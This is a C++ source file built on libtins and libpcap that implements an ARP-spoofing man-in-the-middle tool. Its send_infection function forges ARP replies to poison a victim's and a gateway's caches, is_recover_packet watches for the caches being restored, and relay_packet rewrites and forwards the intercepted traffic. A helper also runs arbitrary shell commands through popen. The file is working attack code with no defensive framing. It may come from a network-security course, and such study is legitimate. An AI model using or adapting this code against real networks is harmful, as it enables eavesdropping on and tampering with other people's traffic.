// netsession.cpp (pcaplib.c에서 수정)
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <pcap.h>

#include "netsession.h"

using namespace Tins;

namespace Netssn {
	bool execute_shell(const char* shell, char* res, int size){
		FILE *sh = popen(shell, "r");
		if(sh == NULL)return 0;

		fgets(res, size, sh);
		pclose(sh);
		return 1;
	}

	bool get_gateway_IP(std::string& oip, std::string& tip){
		IPv4Address target(oip), gateway;
		if(!Utils::gateway_from_ip(target, gateway))return 0;
		tip = gateway.to_string();
		return 1;
	}

	bool get_my_config(std::string oip, std::string& ip, std::string& mac){
		IPv4Address dest(oip);
		NetworkInterface intf(dest);
		NetworkInterface::Info info = intf.addresses();

		EthernetII eth = ARP::make_arp_request(dest,
				info.ip_addr, info.hw_addr);

		PacketSender sender;
		std::unique_ptr<PDU> reply(sender.send_recv(eth, intf));
		if(reply){
			const ARP &arp = reply->rfind_pdu<ARP>();
			ip = arp.target_ip_addr().to_string();
			mac = arp.target_hw_addr().to_string();
			return 1;
		}
		return 0;
	}
	
	bool convert_ip2mac(std::string ip, std::string& mac){
		IPv4Address dest(ip);
		NetworkInterface intf(dest);
		NetworkInterface::Info info = intf.addresses();

		EthernetII eth = ARP::make_arp_request(dest,
				info.ip_addr, info.hw_addr);

		PacketSender sender;
		std::unique_ptr<PDU> reply(sender.send_recv(eth, intf));
		if(reply){
			const ARP &arp = reply->rfind_pdu<ARP>();
			mac = arp.sender_hw_addr().to_string();
			return 1;
		}
		return 0;
	}
}

namespace Netssn {
	using namespace Tins;

	Session::Session(const unsigned packet_size){
		char ebuf[PCAP_ERRBUF_SIZE];
		const char* device = pcap_lookupdev(ebuf);
		if(device == NULL) throw NetException(ebuf);
		mySession = new Sniffer(device, packet_size);
		myDevice = device;
	}

	Session::Session(const char* device, const unsigned packet_size){
		mySession = new Sniffer(device, packet_size);
		myDevice = device;
	}

	void Session::catch_packet(Packet &pkt){
		pkt = mySession->next_packet();
	}

	void Session::catch_packet(std::vector<Packet> &pktvec,
				unsigned int size){
		while(pktvec.size() < size)
			pktvec.push_back(mySession->next_packet());
	}
	
	void Session::send_infection(){
		EthernetII pkt2vt = EthernetII(vtMAC, myMAC)
				/ ARP(vtIP, gtIP, vtMAC, myMAC);
		pkt2vt.find_pdu<ARP>()->opcode(ARP::REPLY);

		EthernetII pkt2gt = EthernetII(gtMAC, myMAC)
				/ ARP(gtIP, vtIP, gtMAC, myMAC);
		pkt2gt.find_pdu<ARP>()->opcode(ARP::REPLY);
		
		PacketSender sender;
		sender.default_interface(myDevice);
		sender.send(pkt2vt);
		sender.send(pkt2gt);
	}

	bool Session::is_recover_packet(Packet pkt){
		if(pkt.pdu()->find_pdu<ARP>()){
			const EthernetII &eth = pkt.pdu()->rfind_pdu<EthernetII>();
			std::cout<<"ARP - "<<eth.src_addr()<<" -> "<<eth.dst_addr()<<std::endl;
			
			// gateway->broadcast, victim->broadcast
			// gateway->victim
			if(eth.dst_addr() == "ff:ff:ff:ff:ff:ff"){
				// broadcast ARP packet?
				puts("broadcast");
				return 1;
			}
			// gateway->victim ARP packet -
			// in real, gateway->attacker packet
			if(eth.src_addr() == gtMAC &&
				eth.dst_addr() == myMAC) return 1;
			// victim->gateway ARP packet?
			// in real, victim->attacker packet
			if(eth.src_addr() == vtMAC &&
				eth.dst_addr() == myMAC) return 1;
		}
		return 0;
	}

	unsigned Session::relay_packet(Packet pkt){
		if(pkt.pdu()->find_pdu<IP>()){
			const IP &ip = pkt.pdu()->rfind_pdu<IP>();
			if(ip.src_addr() == vtIP){
				// MAC : myMAC -> gtMAC
				// IP : myIP -> finalIP
				pkt.pdu()->find_pdu<IP>()->src_addr(myIP);
				pkt.pdu()->find_pdu<EthernetII>()->src_addr(myMAC);
				pkt.pdu()->find_pdu<EthernetII>()->dst_addr(gtMAC);
		
				PacketSender sender;
				sender.default_interface(myDevice);
				sender.send(*pkt.pdu());
				return 1;
			}
			else if(ip.src_addr() == gtIP){
				// MAC : myMAC -> vtMAC
				// IP : myIP -> vtIP
				pkt.pdu()->find_pdu<IP>()->src_addr(myIP);
				pkt.pdu()->find_pdu<EthernetII>()->src_addr(myMAC);
				pkt.pdu()->find_pdu<EthernetII>()->dst_addr(vtMAC);
				
				PacketSender sender;
				sender.default_interface(myDevice);
				sender.send(*pkt.pdu());
				return 2;
			}
		}
		return 0;
	}
}

